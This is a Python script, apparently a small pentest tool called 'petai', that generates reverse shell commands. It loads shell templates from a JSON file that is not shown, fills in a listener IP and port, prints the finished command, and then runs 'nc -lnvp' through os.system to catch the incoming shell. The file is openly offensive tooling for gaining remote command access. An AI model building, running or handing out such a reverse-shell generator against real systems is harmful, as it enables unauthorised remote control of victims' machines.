import sys, json, os
from rich.console import Console; console = Console()

def banner():
    print(" _______  ________ ________  ______  ______ ")
    print("|       \|        \        \/      \|      \\")
    print("| ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓▓\▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓\\\▓▓▓▓▓▓")
    print("| ▓▓__/ ▓▓ ▓▓__      | ▓▓  | ▓▓__| ▓▓ | ▓▓  ")
    print("| ▓▓    ▓▓ ▓▓  \     | ▓▓  | ▓▓    ▓▓ | ▓▓  ")
    print("| ▓▓▓▓▓▓▓| ▓▓▓▓▓     | ▓▓  | ▓▓▓▓▓▓▓▓ | ▓▓  ")
    print("| ▓▓     | ▓▓_____   | ▓▓  | ▓▓  | ▓▓_| ▓▓_ ")
    print("| ▓▓     | ▓▓     \  | ▓▓  | ▓▓  | ▓▓   ▓▓ \\")
    print(" \▓▓      \▓▓▓▓▓▓▓▓   \▓▓   \▓▓   \▓▓\▓▓▓▓▓▓ v0.0.3.2\n")                                                                                        
                                            
def help_me():
    console.print("\n[royal_blue1]###################################################[/]")
    console.print("[royal_blue1]#                                                 #[/]")
    console.print("[royal_blue1]#[/]  [bold orange3 on black]Example:[/][on black]petai.py -id 1 -i 10.10.10.10 -p 1000[/]  [royal_blue1]#[/]")
    console.print("[royal_blue1]#                                                 #[/]")
    console.print("[royal_blue1]###################################################[/]")
    console.print("\n[underline light_green]Usage:[/] petai.py [[light_green]--help[/]]  [-id [[light_green]REVERSE SHELL ID[/]]]  [-i [[light_green]LHOST[/]]]  [-p [[light_green]LPORT[/]]]\n\n")
    console.print("[bold underline orange3 on black]OPTIONS:[/]")
    console.print("-id / --id <[orchid]reverse_shell_id[/]>        :   Reverse Shell ID")
    console.print("-i  / --lhost <[orchid]ip_address[/]/LHOST>     :   Ip Address")
    console.print("-p  / --lport <[orchid]listening_port[/]/LPORT> :   Port")
    console.print("\n[bold underline orange3 on black]WHY NOT OPTIONS:[/]")
    console.print("--help :  show help")
    console.print("--list :  list all the reverse shell [ID]")

def index_err():
    console.print("[underline light_green]Usage:[/] petai.py [[light_green]--help[/]]  [-id [[light_green]REVERSE SHELL ID[/]]]  [-i [[light_green]LHOST[/]]]  [-p [[light_green]LPORT[/]]]\n\n")
    console.print("[bold orange3 on black]Example:[/][on black]petai.py -id 1 -i 10.10.10.10 -p 1000[/]")
    console.print("[bold orange3 on black]Example:[/][on black]petai.py --id 1 --lhost 10.10.10.10 --lport 1000[/]\n")
    console.print("[red][!]Error[/]: Sorry, Try This '[light_green]--help[/]'")

def rvshell(id, lhost, lport):
    with open("src/jering.json", 'r') as f:
        data = json.loads(f.read())
        for i in data["reverse_shell_list"]:
            if i['id'] == id:
                payload = i['shell']
                xp = payload.replace("lhost", lhost)
                vista = xp.replace("lport", lport)
                console.print(f"[bold light_green]The Command:[/] [white]{vista}[/]")
                print("---------------------------------------------------")
                console.print(f"[[light_green]X[/]] [bold gold1]stARt tHe lisTeNer oN {lport}[/]")
                os.system(f"nc -lnvp {lport}")
                break
